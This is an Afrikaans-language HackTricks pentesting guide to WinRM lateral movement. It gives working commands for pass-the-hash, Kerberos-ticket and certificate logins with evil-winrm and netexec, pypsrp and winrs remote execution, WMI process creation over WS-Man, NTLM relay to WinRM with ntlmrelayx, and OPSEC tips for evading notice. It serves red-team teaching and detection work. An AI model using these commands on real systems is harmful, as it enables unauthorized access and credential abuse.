# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM is een van die gerieflikste **lateral movement**-vervoermiddels in Windows-omgewings, omdat dit jou ’n afstandsdop oor **WS-Man/HTTP(S)** gee sonder dat jy SMB-diensskeppingstruuks nodig het. As die teiken **5985/5986** blootstel en jou principal toegelaat word om remoting te gebruik, kan jy dikwels baie vinnig van "geldige geloofsbriewe" na ’n "interaktiewe dop" beweeg.

Vir die **protokol-/diensenumerasie**, listeners, die aktiveer van WinRM, `Invoke-Command` en algemene kliëntgebruik, kyk na:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Waarom operateurs van WinRM hou

- Gebruik **HTTP/HTTPS** in plaas van SMB/RPC, en werk dus dikwels waar PsExec-agtige uitvoering geblokkeer word.
- Met **Kerberos** vermy dit dat herbruikbare geloofsbriewe na die teiken gestuur word.
- Werk goed vanaf **Windows**, **Linux** en **Python**-nutsgoed (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Die interaktiewe PowerShell-remoting-pad begin **`wsmprovhost.exe`** op die teiken in die geverifieerde gebruiker se konteks, wat operasioneel verskil van diensgebaseerde uitvoering.

## Toegangsmodel en voorvereistes

In die praktyk hang suksesvolle WinRM-lateral movement van **drie** dinge af:

1. Die teiken het ’n **WinRM-listener** (`5985`/`5986`) en firewallreëls wat toegang toelaat.
2. Die rekening kan by die endpoint **verifieer**.
3. Die rekening word toegelaat om ’n **remoting-sessie te open**.

Algemene maniere om daardie toegang te verkry:

- **Local Administrator** op die teiken.
- Lidmaatskap van **Remote Management Users** op nuwer stelsels of **WinRMRemoteWMIUsers__** op stelsels/komponente wat steeds daardie groep eerbiedig.
- Eksplisiete remoting-regte wat deur plaaslike sekuriteitsbeskrywings / PowerShell-remoting-ACL-veranderinge gedelegeer word.

As jy reeds ’n boks met admin-regte beheer, onthou dat jy ook **WinRM-toegang sonder volle lidmaatskap van die admin-groep kan delegeer** deur die tegnieke hier beskryf te gebruik:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Verifikasi slaggate wat tydens lateral movement saak maak

- **Kerberos vereis ’n gasheernaam/FQDN**. As jy met ’n IP-adres koppel, val die kliënt gewoonlik terug na **NTLM/Negotiate**.
- In **werkgroep-** of kruistrust-randsituasies vereis NTLM gewoonlik óf **HTTPS** óf dat die teiken by die kliënt se **TrustedHosts** gevoeg word.
- Met **plaaslike rekeninge** wat Negotiate in ’n werkgroep gebruik, kan UAC-afstandbeperkings toegang voorkom, tensy die ingeboude Administrator-rekening gebruik word of `LocalAccountTokenFilterPolicy=1` gestel is.
- PowerShell-remoting gebruik standaard die **`HTTP/<host>` SPN**. In omgewings waar `HTTP/<host>` reeds by ’n ander diensrekening geregistreer is, kan WinRM Kerberos met `0x80090322` misluk; gebruik ’n poortgekwalifiseerde SPN of skakel oor na **`WSMAN/<host>`** waar daardie SPN bestaan.<sup>[[3]](#references)</sup>

As jy geldige geloofsbriewe tydens password spraying kry, is validering daarvan oor WinRM dikwels die vinnigste manier om te kyk of dit jou ’n dop gee:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-na-Windows-lateral movement

### NetExec / CrackMapExec vir validering en eenmalige uitvoering

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM vir interaktiewe shells

`evil-winrm` bly die gerieflikste interaktiewe opsie vanaf Linux omdat dit **wagwoorde**, **NT hashes**, **Kerberos tickets**, **client certificates**, lêeroordrag en in-memory PowerShell/.NET-laaiing ondersteun.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN-randgeval: `HTTP` vs `WSMAN`

Wanneer die verstek-SPN **`HTTP/<host>`** Kerberos-foute veroorsaak, probeer eerder om ’n **`WSMAN/<host>`**-kaartjie aan te vra/te gebruik. Dit kom voor in geharde of ongewone ondernemingsopstellings waar **`HTTP/<host>`** reeds aan ’n ander diensrekening gekoppel is.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Dit is ook nuttig ná **RBCD / S4U**-misbruik wanneer jy spesifiek ’n **WSMAN**-diensticket vervals of aanvra het, eerder as ’n generiese `HTTP`-ticket.

### Sertifikaatgebaseerde verifikasie

WinRM ondersteun ook **verifikasie met kliëntsertifikate**, maar die sertifikaat moet op die teiken aan ’n **plaaslike rekening** gekoppel wees. Vanuit ’n offensiewe perspektief is dit belangrik wanneer:

- jy reeds ’n geldige kliëntsertifikaat en private sleutel wat vir WinRM gekoppel is, gesteel/uitgevoer het;
- jy **AD CS / Pass-the-Certificate** misbruik het om ’n sertifikaat vir ’n principal te bekom en daarna na ’n ander verifikasiepad oor te skakel;
- jy in omgewings werk wat doelbewus afstandbestuur op grond van wagwoorde vermy.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Kliëntsertifikaat-WinRM is baie minder algemeen as password/hash/Kerberos-auth, maar wanneer dit voorkom, kan dit ’n **passwordless lateral movement**-roete bied wat wagwoordrotasie oorleef.

### Python / outomatisering met `pypsrp`

As jy outomatisering nodig het eerder as ’n operateurshell, bied `pypsrp` jou WinRM/PSRP vanaf Python met ondersteuning vir **NTLM**, **certificate auth**, **Kerberos** en **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


As jy fyner beheer nodig het as wat die hoëvlak-`Client`-wrapper bied, is die laervlak-`WSMan` + `RunspacePool`-API's nuttig vir twee algemene operateurprobleme:

- om **`WSMAN`** as die Kerberos-diens/SPN af te dwing in plaas van die verstek-`HTTP`-verwagting wat baie PowerShell-kliënte gebruik;
- om aan 'n **nie-verstek-PSRP-endpoint** te koppel, soos 'n **JEA**-/pasgemaakte sessiekonfigurasie, in plaas van `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Pasgemaakte PSRP-eindpunte en JEA is belangrik tydens laterale beweging

Suksesvolle WinRM-verifikasie beteken **nie** altyd dat jy by die verstek, onbeperkte `Microsoft.PowerShell`-eindpunt uitkom nie. Volwasse omgewings kan **pasgemaakte sessiekonfigurasies** of **JEA**-eindpunte met hul eie ACL's en uitvoer-as-gedrag beskikbaar stel.<sup>[[1]](#references)</sup>

As jy reeds kode-uitvoering op 'n Windows-gasheer het en wil verstaan watter afstandstoegangsvlakke beskikbaar is, inventariseer die geregistreerde eindpunte:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Wanneer ’n bruikbare endpoint bestaan, teiken dit eksplisiet eerder as die default shell:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktiese offensiewe implikasies:

- ’n **beperkte** endpoint kan steeds genoeg wees vir lateral movement as dit net die regte cmdlets/funksies vir diensbeheer, lêertoegang, proseskepping of arbitrêre .NET-/eksterne opdraguitvoering blootstel.
- ’n **verkeerd gekonfigureerde JEA**-rol is besonder waardevol wanneer dit gevaarlike opdragte soos `Start-Process`, breë jokertekens, skryfbare providers of pasgemaakte proxy-funksies blootstel waarmee jy die beoogde beperkings kan omseil.
- Endpoints wat deur **RunAs virtual accounts** of **gMSAs** ondersteun word, verander die effektiewe sekuriteitskonteks van die opdragte wat jy uitvoer. ’n Endpoint wat deur ’n gMSA ondersteun word, kan veral **netwerkidentiteit op die second hop** verskaf, selfs wanneer ’n gewone WinRM-sessie die klassieke delegasieprobleem sou ondervind.

Vir ’n pasgemaakte beperkte endpoint, ondersoek die effektiewe opdrag- en skriptoestemmings afsonderlik: ’n kort `Get-Command`-lys bewys op sigself nie dat ’n bestaande `.ps1` nie kan loop nie. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) beheer uitdruklik watter skrippaaie opgeroep kan word; ander pasgemaakte endpoints kan ander sessiereëls toepas. As ’n toegelate skrip ’n gestoorde `SecureString` gebruik om ’n geloofsbrief vir ’n ander gasheer te skep, gebruik ’n blob wat sonder ’n uitdruklike sleutel geskep is [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) en benodig dit gewoonlik die beskermende gebruiker- en masjienkonteks om dit te dekripteer. Gaan die skrip se ACL, toegelate aanroeping, run-as-identiteit en stroomafwaartse geloofsbriefregte na voordat jy skryfbare bronkode of ’n gekopieerde blob as ’n eskalasiepad tussen gashere beskou. Moenie die beskermde waarde tydens passiewe enumerasie druk nie.

Vir ’n JEA-pasgemaakte funksie wat ’n lêerpad aanvaar, gaan die geregistreerde endpoint-ACL, toegekende rolvermoë en effektiewe run-as-identiteit saam na. ’n Aanroeper kan `NoLanguage` hê terwyl die funksieliggaam in die stelsel se verstektaalmodus loop; ’n virtuele rekening kan ook plaaslike administrateurregte hê. As die funksie ’n toegelate gids met ’n rou stringvoorvoegsel nagaan en later die gegewe pad lees, kan `..`-komponente buite daardie gids oplos. Die grens is die opgeloste pad onder die funksie se identiteit, nie die aanroeper se taalmodus of die oënskynlike voorvoegsel nie. Bevestig die bereikbare funksie en sy validering van die finale pad voordat jy ’n leesbare `.psrc`- of `.pssc`-lêer as ’n bevinding van bevoorregte lêerlees beskou. Sien Microsoft se riglyne oor [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) en [sekuriteitsoorwegings](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` is ingebou en nuttig wanneer jy **native WinRM-opdraguitvoering** wil hê sonder om ’n interaktiewe PowerShell-remoting-sessie te open:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Twee flags is maklik om te vergeet en maak in die praktyk saak:

- `/noprofile` is dikwels nodig wanneer die remote principal **nie** ’n plaaslike administrateur is nie.
- `/allowdelegate` stel die remote shell in staat om jou credentials teen ’n **derde host** te gebruik (byvoorbeeld wanneer die command `\\fileserver\share` nodig het).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operasioneel lei `winrs.exe` gewoonlik tot ’n afgeleë prosesketting soortgelyk aan:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Dit is die moeite werd om te onthou, omdat dit verskil van diensgebaseerde uitvoering en interaktiewe PSRP-sessies.

### `winrm.cmd` / WS-Man COM in plaas van PowerShell-remoting

Jy kan ook deur **WinRM-vervoer** uitvoer sonder `Enter-PSSession` deur WMI-klasse oor WS-Man aan te roep. Die vervoer bly WinRM, terwyl die afgeleë uitvoeringsprimitief **WMI `Win32_Process.Create`** word:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Daardie benadering is nuttig wanneer:

- PowerShell-logging streng gemonitor word.
- Jy **WinRM-vervoer** wil gebruik, maar nie ’n klassieke PS-remoting-werkvloei nie.
- Jy pasgemaakte nutsmiddels rondom die **`WSMan.Automation`** COM-objek bou of gebruik.

## NTLM relay na WinRM (WS-Man)

Wanneer SMB relay deur signing geblokkeer word en LDAP relay beperk is, kan **WS-Man/WinRM** steeds ’n aantreklike relay-teiken wees. Moderne `ntlmrelayx.py` sluit **WinRM-relaybedieners** in en kan relay na **`wsman://`**- of **`winrms://`**-teikens uitvoer.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Twee praktiese notas:

- Relay is die nuttigste wanneer die teiken **NTLM** aanvaar en die relayed principal toegelaat word om WinRM te gebruik.
- Onlangse Impacket-kode hanteer spesifiek **`WSMANIDENTIFY: unauthenticated`**-versoeke sodat probes in die styl van `Test-WSman` nie die relay-vloei onderbreek nie.

Vir beperkings op meer as een hop nadat jy ’n eerste WinRM-sessie verkry het, kyk na:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- en opsporingsnotas

- **Interaktiewe PowerShell-remoting** skep gewoonlik **`wsmprovhost.exe`** op die teiken.
- **`winrs.exe`** skep gewoonlik **`winrshost.exe`** en daarna die aangevraagde kinderproses.
- Pasgemaakte **JEA**-eindpunte kan aksies uitvoer as **`WinRM_VA_*`**-virtuele rekeninge of as ’n gekonfigureerde **gMSA**, wat beide telemetrie en gedrag met die tweede hop verander in vergelyking met ’n gewone gebruikerskonteks-dop.<sup>[[1]](#references)</sup>
- Verwag telemetrie vir **network logon**, WinRM-diensgebeurtenisse en PowerShell-operasionele-/script-block-logboekregistrasie as jy PSRP eerder as rou `cmd.exe` gebruik.
- As jy net ’n enkele opdrag nodig het, kan `winrs.exe` of eenmalige WinRM-uitvoering stiller wees as ’n langdurige interaktiewe remoting-sessie.
- As Kerberos beskikbaar is, verkies **FQDN + Kerberos** bo IP + NTLM om vertrouenskwessies én ongemaklike kliëntkant-`TrustedHosts`-veranderinge te beperk.

## References

- [1] [Microsoft: JEA-sekuriteitsoorwegings](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp LEESMY](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Fout `0x80090322` wanneer PowerShell via WinRM aan ’n afgeleë bediener koppel](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
